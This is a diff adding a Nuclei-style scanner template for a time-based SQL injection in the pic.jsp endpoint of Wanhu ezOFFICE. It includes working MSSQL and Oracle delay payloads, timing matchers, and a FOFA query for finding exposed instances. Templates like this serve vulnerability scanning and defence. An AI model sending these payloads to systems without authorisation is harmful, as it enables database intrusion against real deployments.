@@ -1,0 +1,50 @@
+id: wanhu-ezoffice-pic-sqli
+
+info:
+  name: "万户ezoffice pic.jsp接口SQL注入漏洞"
+  author: monster
+  severity: critical
+  tags: 万户ezoffice
+  metadata: 
+    fofa-query: app="万户网络-ezOFFICE"
+    verified: true
+    max-request: 4
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        GET /defaultroot/platform/portal/portlet/pic/pic.jsp?num=1&channelId=1%27%20WAITFOR%20DELAY%20%270:0:5%27--%20FMZL HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        @timeout: 20s
+        GET /defaultroot/platform/portal/portlet/pic/pic.jsp?num=1&channelId=1%27%20WAITFOR%20DELAY%20%270:0:8%27--%20FMZL HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: mssql
+        dsl:
+          - "status_code_1 == 200 && duration_1>=5 && duration_1<=6 && contains(header_1,'Set-Cookie: OASESSIONID') && contains(body_1,'ifocus_piclist')"
+          - "status_code_2 == 200 && duration_2>=8 && duration_2<=9 && contains(header_2,'Set-Cookie: OASESSIONID') && contains(body_2,'ifocus_piclist')"
+        condition: and
+
+  - raw:
+      - |
+        @timeout: 20s
+        GET /defaultroot/platform/portal/portlet/pic/pic.jsp?num=1&channelId=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),5)--%20OfwB HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        @timeout: 20s
+        GET /defaultroot/platform/portal/portlet/pic/pic.jsp?num=1&channelId=1%27%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),8)--%20OfwB HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: oracle
+        dsl:
+          - "status_code_1 == 200 && duration_1>=5 && duration_1<=6 && contains(header_1,'Set-Cookie: OASESSIONID') && contains(body_1,'ifocus_piclist')"
+          - "status_code_2 == 200 && duration_2>=8 && duration_2<=9 && contains(header_2,'Set-Cookie: OASESSIONID') && contains(body_2,'ifocus_piclist')"
+        condition: and
